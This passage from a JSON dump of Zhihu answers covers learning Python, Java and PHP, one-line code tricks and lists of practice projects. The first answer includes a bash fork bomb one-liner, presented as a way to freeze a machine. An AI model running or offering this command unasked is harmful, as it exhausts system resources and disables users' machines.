"b6e259b3e2abf5f23c92ad7e16baa1a3"},{"answer_url": "https://www.zhihu.com/question/285586045/answer/481988416", "answer_id": 481988416, "comments_num": 34, "answer_article": "可以把一台机器卡死：:(){ :|: &amp; };:\n以前提到过的一行GCD(答案结果为y)： while(x^=y^=x^=y%=x);\n判断一个数是不是  :return !(x &amp; (x - 1))\n可以防止溢出的求平均数的方法:其一  ：(x &amp; y) + ((x ^ y) &gt;&gt; 1)\n其二  ：(x | y) - ((x ^ y) &gt;&gt; 1)\netc.", "praise_num": 213, "answer_object_id": "d5d2339a3dc77921cccaf79b955f3644"},{"answer_url": "https://www.zhihu.com/question/20039623/answer/229969226", "answer_id": 229969226, "comments_num": 20, "answer_article": "最好看好用的Python指南看这里了！造数-新一代智能云爬虫提前说一下，这篇福利多多，别的不说，直接让你玩回最有手感的怀旧游戏，参数贴图很方便自己可以根据喜好修改哦。本篇通过以下四块展开，提供大量资源对应。&lt;img src=\"https://pic1.zhimg.com/v2-0596a6068c94c031ecee80a343bac5bc_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1264\" data-rawheight=\"866\" class=\"origin_image zh-lightbox-thumb\" width=\"1264\" data-original=\"https://pic1.zhimg.com/v2-0596a6068c94c031ecee80a343bac5bc_r.jpg\"&gt;【选一个好版本 有没有看过《在下坂本，有何贵干？》那个坂本可以装B，Python的版本则是你的工作环境。&lt;img src=\"https://pic1.zhimg.com/v2-9e5da23725b79ceb308dda76f0894930_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"427\" data-rawheight=\"293\" class=\"origin_image zh-lightbox-thumb\" width=\"427\" data-original=\"https://pic1.zhimg.com/v2-9e5da23725b79ceb308dda76f0894930_r.jpg\"&gt;首先，在学习之前一定会考虑一个问题——Python版本选择对于编程零基础的人来说，选择Python3。&lt;img src=\"https://pic3.zhimg.com/v2-d31e08d7692e3e8952b265b24f639752_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1878\" data-rawheight=\"917\" class=\"origin_image zh-lightbox-thumb\" width=\"1878\" data-original=\"https://pic3.zhimg.com/v2-d31e08d7692e3e8952b265b24f639752_r.jpg\"&gt;1、学习基础知识首先，Python 是一个有条理的、强大的面向对象的程序设计语言。建议从下面课程开始：Python 教程Python 标准库官方文档 （非常贴心地提供中文翻译）&lt;img src=\"https://pic2.zhimg.com/v2-945fd34c2d20c18d943656315cf771b1_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1614\" data-rawheight=\"601\" class=\"origin_image zh-lightbox-thumb\" width=\"1614\" data-original=\"https://pic2.zhimg.com/v2-945fd34c2d20c18d943656315cf771b1_r.jpg\"&gt;首先需要学习Python的基础知识，下载、安装、导入库、字符串处理、函数使用等等。a、查看文章 BeginnersGuide/Download，按步骤下载正确的Python版本。b、接下来，阅读教程，并尝试用你的新Python编译器做一些简单的练习。如果你之前没有编程经验，读一下 [[BeginnersGuide/NonProgrammers]， 里面有适合你的教程列表。如果你之前有编程经验，参考 BeginnersGuide/Programmers, 里面列出了更多高级教程。如果英语不是你的母语，阅读翻译好的教程更适合你。参考 python.org's 非英语资源列表.c、当你读完教程后，可以浏览Python在线文档d、在准备写第一个程序前，你需要一个文本编辑器 PythonEditorsps：有一个超赞的网站，提供很多文档的中文翻译，有Python、pandas、numpy、NLTk、Django等等，值得收藏。一译中文文档&lt;img src=\"https://pic3.zhimg.com/v2-7f9047e8bb422e3dfed285fb908be24e_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1566\" data-rawheight=\"782\" class=\"origin_image zh-lightbox-thumb\" width=\"1566\" data-original=\"https://pic3.zhimg.com/v2-7f9047e8bb422e3dfed285fb908be24e_r.jpg\"&gt;如果你更喜欢看视频零基础学Python语言 嵩天老师的课程，非常全面细致零基础入门学习Python 小甲鱼的入门视频，讲课十分有趣Python for Everybody Course上非常经典的Python教学视频2、确定学习方向Python职业学习方向很多，大体上分为这四个&lt;img src=\"https://pic4.zhimg.com/v2-af233a8917a32362d34ea3cebb6bafe3_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1476\" data-rawheight=\"783\" class=\"origin_image zh-lightbox-thumb\" width=\"1476\" data-original=\"https://pic4.zhimg.com/v2-af233a8917a32362d34ea3cebb6bafe3_r.jpg\"&gt;针对各个方向，造数君提供了需要了解的标准库：后端开发：Django、Flask、Tornado数据科学：NumPy、Pandas、Matplotlib网络爬虫、Requests、Scrapy、threading机器学习：scikit-learn、TensorFlow&lt;img src=\"https://pic3.zhimg.com/v2-0cfc4217ce2d2f9d2761bfedd4acf396_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1541\" data-rawheight=\"792\" class=\"origin_image zh-lightbox-thumb\" width=\"1541\" data-original=\"https://pic3.zhimg.com/v2-0cfc4217ce2d2f9d2761bfedd4acf396_r.jpg\"&gt;后端开发学习图同时，你也可以用Python来写游戏http://www.pygame.org/tags/all&lt;img src=\"https://pic4.zhimg.com/v2-ea9766b86c16fea160d8ac50b9e66dd3_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"918\" class=\"origin_image zh-lightbox-thumb\" width=\"1920\" data-original=\"https://pic4.zhimg.com/v2-ea9766b86c16fea160d8ac50b9e66dd3_r.jpg\"&gt;除了文档，还有这些地方可以学习：后端开发_Python入门基础到高级教程Python研发工程师学习路线Full Stack PythonThink Pythonawesome-python&lt;img src=\"https://pic1.zhimg.com/v2-6925fe8a33ff1434642c3d078dec93a0_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1517\" data-rawheight=\"868\" class=\"origin_image zh-lightbox-thumb\" width=\"1517\" data-original=\"https://pic1.zhimg.com/v2-6925fe8a33ff1434642c3d078dec93a0_r.jpg\"&gt;举个例子，以前学习Django的时候，看到全英文的文档，当时一脸懵逼。后来找到一译，看完了文档，又找到了一些博客：前言_Django博客教程  学光的教程 Django 模板   自强学堂的分享Django从入门到实战  实验楼的路径学习python web 入坑指南  知乎后端工程师所著3、项目练手只会埋头敲代码肯定不行的，需要自己动手写写具体的项目，那么去哪里找呢？造数君以前曾经提供了一些：Python 有哪些一千行左右的经典练手项目？&lt;img src=\"https://pic2.zhimg.com/v2-93cf92cfcaea933bd3fd6fea4460d499_b.gif\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"600\" data-rawheight=\"331\" data-thumbnail=\"https://pic2.zhimg.com/v2-93cf92cfcaea933bd3fd6fea4460d499_b.jpg\" class=\"origin_image zh-lightbox-thumb\" width=\"600\" data-original=\"https://pic2.zhimg.com/v2-93cf92cfcaea933bd3fd6fea4460d499_r.jpg\"&gt;Tips：如果你想寻找某个项目，可以去Github上找。例如，我想写一个知乎爬虫，搜索“知乎”，选择Python分类Github&lt;img src=\"https://pic4.zhimg.com/v2-7176186d9419528342f731abdc4eaf83_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1339\" data-rawheight=\"903\" class=\"origin_image zh-lightbox-thumb\" width=\"1339\" data-original=\"https://pic4.zhimg.com/v2-7176186d9419528342f731abdc4eaf83_r.jpg\"&gt;新世界啊，有没有。同时，自己的项目可以分享出来，例如最大的同性交友网站 Github 、真实的网络问答社区 知乎 、 如果觉得不爽，还可以自己搭建一个博客 教你免费搭建个人博客 。4、商业化协作等到了这个阶段，你已经找到了一份Python相关的工作。你需要更好的与同事配合，了解更多语言特性。 例如 有人曾经写到 ：需要扩展Python语言的理由：添加/额外的（非Python）功能，提供Python核心功能中没有提供的部分，比如创建新的数据类型或者将Python嵌入到其它已经存在的应用程序中，则必须编译。性能瓶颈的效率提升， 解释型语言一般比编译型语言慢，想要提高性能，全部改写成编译型语言并不划算，好的做法是，先做性能测试，找出性能瓶颈部分，然后把瓶颈部分在扩展中实现，是一个比较简单有效的做法。保持专有源代码的私密，脚本语言一个共同的缺陷是，都是执行的源代码，保密性便没有了。把一部分的代码从Python转到编译语言就可以保持专有源代码私密性。不容易被反向工程，对涉及到特殊算法，加密方法，以及软件安全时，这样做就显得很重要。python扩展实现方法--python与c混和编程这里给出一个闯关网站：The Python Challenge ， 非常好玩，大家可以再评论中给出答案&lt;img src=\"https://pic2.zhimg.com/v2-13f69a38062e145abe4f793e16787a61_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"918\" class=\"origin_image zh-lightbox-thumb\" width=\"1920\" data-original=\"https://pic2.zhimg.com/v2-13f69a38062e145abe4f793e16787a61_r.jpg\"&gt;最后，我们看看Python的薪资情况&lt;img src=\"https://pic2.zhimg.com/v2-f65be5084aa9b353b486cc2aa741699d_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1082\" data-rawheight=\"687\" class=\"origin_image zh-lightbox-thumb\" width=\"1082\" data-original=\"https://pic2.zhimg.com/v2-f65be5084aa9b353b486cc2aa741699d_r.jpg\"&gt;python工程师工资收入多少Python酷不酷、你想不想学？最近跟小伙伴建了Python交流群，若感兴趣可以加一下微信：zaoshuio 。更多精彩内容关注造数科技最后留下一个小问题：猴子第一天摘下若干个桃子，当即吃了一半，还不瘾，又多吃了一个。第二天早上又将剩下的桃子吃掉一半，又多吃了一个。以后每天早上都吃了前一天剩下的一半零一个。到第10天早上想再吃时，见只剩下一个桃子了。求第一天共摘了多少。大家试试使用Python来解决这个数学问题，欢迎评论中交流大家如果有对爬虫感兴趣的，不妨来看看我们的课程Python爬虫", "praise_num": 469, "answer_object_id": "a9e8fb36202a457005dd7216422ddca9"},{"answer_url": "https://www.zhihu.com/question/40801731/answer/88336537", "answer_id": 88336537, "comments_num": 13, "answer_article": "都行，选java还是php并不重要。重要的是，开始去做，现在。", "praise_num": 51, "answer_object_id": "ca7a63b78f8a809719a7bd1c0c583e6a"},{"answer_url": "https://www.zhihu.com/question/40801731/answer/91814769", "answer_id": 91814769, "comments_num": 435, "answer_article": "看了那么多答案，我想说，你们不要误人子弟。请相信我的回答。为了增加自己的说服力，必须亮一下自己的经历了。清华大学硕士毕业，在北京写过两年Java，在杭州写过三年Python，深入定制过Python虚拟机，现在从事arm上的javascript虚机机的开发。虽然仍然不是什么牛人，但我觉得我的经验能对大多数新入门的从业人员提供参考。以下是正式回答。这三门当中，首推Java。真的，Python当然是好，但是对于一个新入门的人，最重要的是先找到工作不是吗？而找工作的话，Java无疑是最容易的。对于跨行业的人而言，最困难的其实是第一步，那就是如何进入这个行业。如果你连进都进不来，第一份工作迟迟无法开始，那么好好努力，补上数据结构，设计模式，算法设计这些差距就根本无从说起，不是吗？不要被什么科班出身之类的说法吓坏了。虽然我是科班出身，但我始终觉得，只要你肯努力，这里面并没有什么无法逾越的鸿沟，最重要的是不要好高骛远，也不要急于求成。学习和积累是有一个过程的，在程序员这个行当，你一分付出，就会有一分回报。尊重学习的内在规律，循序渐进，终有一天，你会成为你想成为的那个人的。接着，我来谈谈具体的规划。1. 了解Java的运行环境。搞清楚path和classpath是干什么的，怎么在命令行进行编译，执行。知道IDE的各个按钮后面真正发生了什么事情。2. 掌握Java的语法。搞清楚包，接口，类，继承这些基本概念。掌握多态，overwrite，死背下IO的接口，包括InputStream/OutputStream和Writer/Reader，死背下网络编程和GUI编程的接口，死背JDBC接口。这一步，推荐的书是《 Thinking in Java》。3. 掌握多线程编程。弄明白ConcurrencyHashMap是怎么实现的，搞清楚synchronized是怎么回事，弄明白为什么要有Runnable接口。在第二步和第三步掌握到80%的时候，你就可以考虑找工作了。4. 在工作中体会一下设计模式。推荐《Java与模式》这本书。看完里面的Decorator，IO接口你再也不会去死记硬背了。用的时候，根据Adaptor和Decorator的命名规则，自己临时推都推得出来。5. 恶补数据结构。 搞清楚 LinkedList和 ArrayList的实现机制，了解它们的每一个接口的时间复杂度。同样的还有其他容器，Map啊，Set啊，都是一样的。栈，队列，二叉树，图贯穿编程始终，如果这一步你迈不过去，那就只能在低阶程序员里打转。6. 如果有可能，最好对一些算法设计也有所涉猎。比如动态规则的思路，贪心算法，诸如KMP这种奇妙的算法等。这一步没有数据结构那么重要，学得好当然好，学不好也不用太挫败。到了这一步，你和科班程序员之间的差距就不大了。可以在工作中独立承担开发任务了。7. 进阶，这时候就可以有自己的思考了。Java发展到现在，被用在各种各样的情景之中，说它是应用最广泛的编程语言并不过分。你在打好基础以后，就可以考虑应该向哪个方向发展了。比如服务端的架构，最好能学习一下JavaEE。JEE一直以来，都是让人觉得门槛太高。这个其实可以从Spring入手，搞清楚反射，控制反转，依赖注射都是什么鬼（这些神叨叨的名词其实都是为了解决Java本身不够动态这个缺陷而出现的，这里不展开，我只想提醒的是，这些概念没有什么大不了的东西，不要被爱装逼的家伙吓住了）。还有消息这个东西，还有ORM这个东西，都去搞搞清楚。想一下它们要解决什么问题，再猜一下他们是怎么实现的。我面试的时候发现，其实大多数优秀的开发者，即使以前没思考过这个问题，让他现场设计一下Hibernate，都能设计得差不多。这说明，这些框架性的东没有什么大不了的。有了基础，你也能设计出来。关键是要去动脑筋想。以上是以服务端开发举例，那么对于客户端，你就去思考事件响应机制是如何工作的（这个我不熟悉，就不再多说了）。还可以深入研究一下JVM的源代码，以及其实现机制，了解一下垃圾回收算法等等。到了这一步，你就可以应聘Java高级开发了。如果运气好，年薪30万是有可能的。保底也要20万了。8. 架构。到了这一步，你就算是登堂入室，真正迈入高级开发人员了。这一步，你要思考更多的东西，比如，如何处理高并发，如何应对分布式系统，如何提供更健壮的数据服务。到了这一步，那就没有什么可以参考的，现成的东西了。全靠自己的悟性了。那最后能达到什么高度，就不是我这个层次能点评的了。编程的世界永远向所有热爱编程的人开放，这是一个自由，平等，共享的世界，我始终是这样坚信的。希望你能成为一个成功的程序员。祝好。以上。======  下面是广告时间。知乎专栏我的知乎专栏，进击的Java新人，为Java新手们准备的教程。专栏里的内容是完全免费的。欢迎大家关注。以及我的公众号：我的公众号", "praise_num": 9623, "answer_object_id": "ea44d8797ad231bb37560adbdf0e134e"},{"answer_url": "https://www.zhihu.com/question/285586045/answer/453517491", "answer_id": 453517491, "comments_num": 48, "answer_article": "C/C++/js这种，一行代码基本可以做到你能想到的能用这种语言去做的绝大多数事情----反正换行符不是必要的", "praise_num": 271, "answer_object_id": "604ef2cab26176c05478f6ac0aed3f09"},{"answer_url": "https://www.zhihu.com/question/20039623/answer/14621534", "answer_id": 14621534, "comments_num": 60, "answer_article": "虽然我不是Python高手，但我是零基础，之前会的都是软件PS，PPT之类。如果目的是想成为程序员，参考教学大纲。如果只是学程序，理解科技，解决工作问题，我的方式可以参考使用：1，找到合适的入门书籍，大致读一次，循环啊判断啊，常用类啊，搞懂（太难的跳过）2，做些简单习题，字符串比较，读取日期之类 Python Cookbook不错（太难太无趣的，再次跳过，保持兴趣是最重要的，不会的以后可以再学）3，加入Python讨论群，态度友好笑眯眯（很重要，这样高手才会耐心纠正你错误常识）。很多小问题，纠结许久，对方一句话点播思路，真的节约你很多时间。耐心指教我的好人，超级超级多谢。4，解决自己电脑问题。比如下载美剧，零散下载了2，4，5，8集，而美剧共12集，怎样找出漏下的那几集？然后问题分解，1读取全部下载文件名，2提取集的数字，3数字排序和（1--12）对比，找出漏下的。5，时刻记住目的，不是为了当程序员，是为了解决问题。比如，想偷懒抓网页内容，用urllib不行，用request也不行，才发现抓取内容涉及那么多方面（cookie，header，SSL，url，javascript等等），当然可以听人家劝，回去好好读书，从头读。或者，不求效率，只求解决，用ie打开网页再另存为行不行？ie已经渲染过全部结果了。问题变成：1--打开指定的10个网页（一行代码就行）。更复杂的想保存呢？利用已经存在的包，比如PAM30（我的是Python3），直接打开ie，用函数outHTML另存为文本，再用搜索函数（str搜索也行，re正则也行）找到数据。简单吧？而且代码超级短。6，保持兴趣，用最简单的方式解决问题，什么底层驱动，各种交换，留给大牛去写吧。我们利用已经有的包完成。7，耐心读文档，并且练习快速读文档。拿到新包，找到自己所需要的函数，是需要快速读一次的。这个不难，读函数名，大概能猜到是干嘛的，然后看看返回值，能判断是不是自己需要的。8，写帮助文件和学习笔记，并发布共享。教别人的时候，其实你已经自己再次思考一次了。我觉得学程序就像学英文，把高频率的词（循环，判断，常用包，常用函数）搞懂，就能拼装成自己想要的软件。然后，http://stackoverflow.com 和http://Google.com 是很好用的。然后，坚持下去～6月10日补充------------------------------一定要保持兴趣，太复杂的跳过，就像小学数学，小学英语，都是由简入深。网络很平面，无数国际大牛著作好书，关于Python，算法，电脑，网络，或者程序员思路，或者商业思维（浪潮之巅是本好书）等等，还有国际名校的网络公开课（中英文字幕翻译完毕，观看不是难事），讲计算机，网络，安全，或者安卓系统，什么都有，只要能持续保持兴趣，一点点学习下去，不是难事。所有天才程序员，都曾是儿童，回到儿童思维来理解和学习。觉得什么有趣，先学，不懂的，先放着，遇到问题再来学，效果更好。唯一建议是，不要太贪心，耐心学好一门优雅的语言，再学其它。虽然Javascript做特效很炫，或提某问题时，有大牛建议，用Ruby来写更好之类，不要改方向。就像老笑话：“要学习递归，必须首先理解递归。”然后死循环一直下去。坚持学好一门语言，再研究其他。即使一门语言，跟网络，数据库等等相关的部分，若都能学好，再学其他语言，是很快的事情。另外就是，用学英文的耐心来学计算机，英文遇到不懂的词，抄下，查询。python里，看到Http，查查定义，看到outHtml，查查定义，跟初学英语时候一样，不要直接猜意思，因为精确描述性定义，跟含糊自然语有区别的。而新人瞎猜，很容易错误理解，wiki，google很有用。我还在使劲啃Python的路上～～      一起加油：）2012年8月26日补充线------------------------------------------------------------------QQ群：22507237 陆续有些高手走了，也有新人加入。另外 10月20日，上海有Python开发者大会，有空的孩子可以去。http://pycon2012.51qiangzuo.com/给出2个截图吧，我最近做的，真的很烂，但是能用：）这个是上次Python测试题目“从电商网站的搜索页中抓取制作商品图片墙”。我选了最最容易的静态网站。当然京东的抓取，比这种难。&lt;img src=\"https://pic2.zhimg.com/6c36c5c65421e088fac5a373d3ccc095_b.jpg\" data-rawwidth=\"1131\" data-rawheight=\"555\" class=\"origin_image zh-lightbox-thumb\" width=\"1131\" data-original=\"https://pic2.zhimg.com/6c36c5c65421e088fac5a373d3ccc095_r.jpg\"&gt;这个很方便我自己每天查询，用Python3 + PyQt4，用“公司名字”关键词，在各个论坛，图片，视频，商场查询。每天看一次，很方便快速了解信息。&lt;img src=\"https://pic2.zhimg.com/fa51cacc13a814e7f929457f191a4435_b.jpg\" data-rawwidth=\"836\" data-rawheight=\"274\" class=\"origin_image zh-lightbox-thumb\" width=\"836\" data-original=\"https://pic2.zhimg.com/fa51cacc13a814e7f929457f191a4435_r.jpg\"&gt;", "praise_num": 1641, "answer_object_id": "4e2acc25a46fb5edf95aad1e5a39477b"},{"answer_url": "https://www.zhihu.com/question/40801731/answer/506876247", "answer_id": 506876247, "comments_num": 5, "answer_article": "                                                 说一下我自己     我10年毕业后在武汉做第一份工作，这家公司是做治安卡口的。总所周知，08年的一场金融风暴，使当时的经济环境非常不好，而治安卡口都是公安类的项目，大家都懂，这样的项目不是谁都能做的，所以当时的公司整体盈利状况都比较良好。     当时公司的一个前辈跟我讲，小张，你还年轻，又有冲劲，我建议你去大城市去发展，对你以后会很好。这个前辈是做嵌入式开发的，每天都是拿着各种摄像头的板子焊来焊去的，然后跑到烽火去制作成品，他还带了个小徒弟，是个应届小女生，不过后来没多久这个小女生转做了行政。他跟我说，她没有领悟力，感觉她实在做不了这些。而这位前辈多大年龄呢？近50岁！     在这家公司我接手了一堆项目，有PHP的，http://ASP.NET的，VB的，Java的。这半年时间我基本上都是在这几个项目上东改bug，西填坑，很多上古代码动也不敢动。到了年底，我也就听了这位前辈的话，跟总监提出了离职。离职当天他开车送我去火车站，并交代我出去后，一定要好好努力，多结识年长的人，学习他们身上的优点。这个人是我踏入社会遇到的第一个贵人，我现在仍然还记得他的长相。可惜的是，当时懵懂，只知道叫他李工，不知道他的具体姓名。然后过完年11年就去了北京，一直待到了17年。在北京后就一直在做Java研发，当时找工作时，就觉得Java开源，一定比PHP和ASP .NET有前景。移动互联网领域Android的崛起,京东&amp;携程崛起从http://ASP.NET转为Java，链家将PHP的权重向Java倾斜等等,都证明我当初的选择是对的。                                           说一下我对初学者的建议     首先题主有学过目前已经在做PHP的工作，那么你看过一点儿Java的话会比较亲切，毕竟语法有很多相似的地方，甚至很多函数名称都基本一致。有这些基础后，学起来会相对较快。前端嘛，这个我觉得都是需要学的，起码得搞清除JS的dom吧，常用的api的记住吧，CSS不说你能写的多漂亮，起码的布局定位得会，配色好看不好看这个真的是强求不来的。最后说一说Python，我很少听说过就会一个Python就能工作的，起码还得会点其他的语言，所以在我的认知范围内我将它定义为胶水语言，做做爬虫，写写脚本。当然不排除有些公司主语言就是Python，但是这样的公司少的话，你的工作会好找吗？最后说一说 上来就说数学好的话，就学Python搞大数据，excuse me？首先大数据是一个宽泛概念，细分领域太多了，无论是埋点统计还是反作弊这些可都不是说会用两个api就行的。然后就是大数据的MR相关框架你要不去看看apache占多少？     然后说一说每个想入行的新同学的一些基本疑问，像什么我不是科班能学这个吗？ 我讲句实话，你本专业的课都学的很好吗？在本专业出类拔萃了？你学的时候真能知道这些玩意儿是干嘛的？那么现在这么多科班出身的，他们的专业课就会学的很好了吗？ 其实大家都一样的，就酱紫。然后千万别看那些上来就是读一遍JVM源码，知乎人均手写JVM水平。这不是扯淡吗？一个个说的有多牛似的，估摸着好多人连OracleJDK和OpenJDK都分不清楚。      好了，别心浮气躁，静下心来一点点学吧。具体怎么学，去哪里学，我这里贴一个我之前回答的学习路线吧，希望对你有帮助。Java 学习线路图是怎样的？​www.zhihu.com", "praise_num": 11, "answer_object_id": "7bdc3b90108f13da63bfd591e5666e15"},{"answer_url": "https://www.zhihu.com/question/29372574/answer/88744491", "answer_id": 88744491, "comments_num": 226, "answer_article": "补充了几个数据分析的项目，目前是33个Python项目，会继续保持更新。Learn by doing才是正确的技术学习姿势。20171009更新：NBA常规赛结果预测--利用Python进行比赛数据分析Python 气象数据分析20161230更新：Python基于共现提取《釜山行》人物关系20160918更新：Python - Python3 实现火车票查询工具20160816更新：Python - 高德API+Python解决租房问题20160802更新：Python - Python3 色情图片识别………………………………………………分隔线………………………………………………最近几天刚好在整理Python项目，项目由易到难，代码量从几十行到几千行，在实验环境里保证可以全部完成。找到你认为有趣的去实现它，把项目做出来，知识才能变成自己的：）(建议PC端访问，边看教程边在环境里动手实践，手机上仅可查看教程)入门和进阶篇均为免费课程，可以免费使用在线练习环境。入门篇1.Python - Python 图片转字符画50 行 Python 代码完成图片转字符画小工具。&lt;img src=\"https://pic1.zhimg.com/739f35ab6c535fcb83d16a02693fa5f4_b.png\" class=\"content_image\"&gt;2.Python - 200行Python代码实现2048仅用200行的python代码完成2048小游戏的编写。3.Python - pygame开发打飞机游戏使用Python快速开发一款PC端玩耍的微信打飞机游戏，基于pygame实现。4. Python 实现简单画板要利用 Pygame 模块来自己实现一个功能更加简单的画板。&lt;img src=\"https://pic1.zhimg.com/v2-0b75bbd1f7d8d45c182e3fdbdf740600_b.png\" class=\"content_image\"&gt;5.Python - 全面解析PythonChallenge本课程带领大家一步一步攻克Python Challenge中的难题，在一个又一个脑洞大开的 Python 问题中提升自己的 Python 水平。 6.Python - 使用 Python 解数学方程介绍如何用python解决数学题。 说到数学题，相信大家都不陌生，从小学到大学都跟数学打交道。 其中初中的方程组，高中的二次曲线，大学的微积分最为头疼，今天我们将使用python 来解决方程组问题，微积分问题，矩阵化简。 7.Python - 基于 Python 的文件备份Python 做个简单的备份脚本程序，可以备份主目录和系统文件等。8.Python - Kaggle入门：泰坦尼克号幸存者项目Kaggle是一个线上数据科学竞赛类网站。本课程将使用python科学计算工具对Kaggle提供的泰坦尼克号上的人员数据进行分析建模。9.Python - Python文本解析器使用Python来解析纯文本生成一个HTML页面的小程序。10.Python - Python3实现简单的FTP认证服务器 日常生活中我们共享文件都是通过QQ，微信等软件来实现的，今天将通过本课程将教大家使用Python在自己的电脑上架设一个FTP服务器，用来管理自己日常生活中的文件。11.Python - Python 3 实现 Markdown 解析器 本课程我们将使用 Python 3 打造 Markdown 文本解析器，并且程序支持输出 HTML 格式与 PDF 格式的文件。12.Python - Python 破解验证码通过一个简单的例子来讲解破解验证码的原理。13.Python - 用Python做2048游戏通过GUI来体验编程的乐趣。14.Python - Python实现简单的Web服务器使用 Python 语言实现一个 Web 服务器，探索 HTTP 协议和 Web 服务的基本原理。进阶篇15.Python - Python3 色情图片识别使用 Python3 去识别图片是否为色情图片，我们会使用到 PIL 这个图像处理库，会编写算法来完成对划分图像的皮肤区域。&lt;img src=\"https://pic3.zhimg.com/76521ab2e38570a3204c65abcc5276a6_b.png\" class=\"content_image\"&gt;16.Python - Python实现3D建模工具本课程将基于OpenGL实现一般CAD软件都会具备的基础功能：渲染显示3D空间的画面并可以操作3D空间中物体。&lt;img src=\"https://pic2.zhimg.com/c3e9179777646c1af504f0f855078ac9_b.png\" class=\"content_image\"&gt;17.Python - Python3 实现火车票查询工具本课程使用 Python3 抓取 12306 网站信息提供一个命令行的火车票查询工具。通过该项目的实现，可以熟悉 Python3 基础及网络编程，以及 docopt，requests，prettytable 等库的使用。18.Python - Python实现基于协程的异步爬虫探讨几种实现爬虫的方法，从传统的线程池到使用协程，每节课实现一个小爬虫。另外学习协程的时候，我们会从原理入手，以ayncio协程库为原型，实现一个简单的异步编程模型。19. PyQt 实现简易浏览器基于 Python 3.4 和 PyQt 5 来学习 GUI 编程，课程分为两次实验，第一次实验先简单了解 Qt 各个组件的使用方法，第二次课程将尝试实现一个浏览器。20. Python基于共现提取《釜山行》人物关系针对《釜山行》剧本的文本，使用python编写代码分析文本中人物的共现关系，完成对《釜山行》文本的人物关系提取，并利用Gephi软件对提取的人物关系绘制人物关系图。&lt;img src=\"https://pic4.zhimg.com/v2-438fef09e3e9c512e19287f217acad5f_b.png\" class=\"content_image\"&gt;21.Python - 使用 Python 3 编写系列实用脚本使用 Python 3 来编写一系列的实用脚本，实验的过程中能熟悉 Python 3 的使用，学习使用各种功能强大的模块。22.Python - Python实现Python解释器从实现一个玩具解释器开始学习解释器基本知识,然后考察Python字节码进一步学习理解Python解释器的内部机制，最终实现一个500行以内的Python解释器。23.Python - 高德API+Python解决租房问题编写Python脚本爬取某租房网站的房源信息，利用高德的 js API 在地图上标出房源地点，划出距离工作地点1小时内可到达的范围，附上公交路径规划功能查看不同路径的用时。&lt;img src=\"https://pic3.zhimg.com/a54f86931f81b48790b50736bf542ac2_b.jpg\" class=\"content_image\"&gt;24.Python - 基于Flask/RethinkDB/Backbone.js实现TODO List使用 RethinkDB，Flask 与 Backbone.js 制作一个简单的 todo list。25.Python 气象数据分析对意大利北部沿海地区的气象数据进行分析与可视化。26.NBA常规赛结果预测--利用Python进行比赛数据分析利用NBA在2015~2016年的比赛统计数据进行回归模型建立，最终在今年2016~2017的常规赛中预测每场比赛的输赢情况。&lt;img src=\"https://pic2.zhimg.com/v2-b0912d1326b1d4928b833f2494574255_b.jpg\" data-rawwidth=\"983\" data-rawheight=\"289\" class=\"origin_image zh-lightbox-thumb\" width=\"983\" data-original=\"https://pic2.zhimg.com/v2-b0912d1326b1d4928b833f2494574255_r.jpg\"&gt;27.Python - Flask开发轻博客使用Python Flask Web框架开发一个具备基本功能的轻博客平台，在其中学习Python的Web开发。28.Python - Django 搭建简易博客本教程介绍如何一步步使用 Django 开发一个简单的博客 Web应用，涉及 Django Web开发，MVC，Template等知识点，适用于有 Python 和 Django 基础的同学。&lt;img src=\"https://pic4.zhimg.com/c510d04d5e6cd7c37b572564c8bb54bf_b.png\" class=\"content_image\"&gt;综合篇已下项目对环境占用资源较大，属于会员及训练营项目。29.Python - Python3 实现淘女郎照片爬虫 本实验通过使用 Python 实现一个淘宝女郎图片收集爬虫，学习并实践 BeautifulSoup、Selenium Webdriver 及正则表达式等知识。 30.Python - 基于 Flask 及爬虫实现微信娱乐机器人本次课程是基于 Flask Web 框架开发的娱乐级别的微信公众号后台，学习并实践 python 编程，Flask Web 开发以及微信公众平台开发机器人的基本步骤。31.Python - Python版设计模式实践多种常见的设计模式的原理以及如何应用实践,涵盖工程模式，命令模式，外观模式，适配器模式，装饰模式，代理模式等。32.Python - 仿OpenStack开发云计算管理软件使用Python语言开发一套类似OpenStack的云计算管理平台LouCloud，具备基本的用户，服务器，镜像与虚拟机管理功能。33.Python - 仿StackOverflow开发在线问答系统使用Python Flask Web开发框架实现一套类似StackOverflow的在线问答平台LouQA，具备提问，回答，评论点赞等功能。", "praise_num": 11951, "answer_object_id": "2338b437fc49e0b6c79f54dc5fb382a2"},{"answer_url": "https://www.zhihu.com/question/29372574/answer/88624507", "answer_id": 88624507, "comments_num": 135, "answer_article": "更新：兄弟们如此给力，小弟受宠若惊，好东西就是用来分享的。 500 line or less只是某个系列丛书中第四本，其他三本链接：http://www.aosabook.org/en/index.html可以在线看哦前两本每章介绍出名开源软件的架构，你说的上名字的开源基本上都能找到，短小精悍的介绍框架第三本介绍开源软件中实际遇到的一些performance的问题以及解决方案，同样浓缩啊！！ 每章的作者大多就是此开软软件的开发者啊！！！不用多说，点开你就知道啊不想看英文的怒点 http://www.ituring.com.cn/article/13057前两卷的中文版，不知道翻译的怎么样----------------------------------------割了你--------------------------------------------------------------和楼主一样在学习python， 最近找到一本python神书 500 line or less. 有兄弟提到了git的源码，这里不只是源码，而是这么一本书，目前还没出版，但是在网上有已经看到了 review版本。强烈推荐！！！强烈推荐！！！强力推荐！！！这本书共16个章节，每章均是由该领域的大牛完成，用不到500行的代码实现一个特（装）定（逼）功能。本书链接 http://aosabook.org/blog/目录页：http://aosabook.org/blog/以下是章节目录，每一章都让你热血澎湃，看完介绍你就向往下读。1. A Template Engine （http://aosabook.org/en/500L/a-template-engine.html）    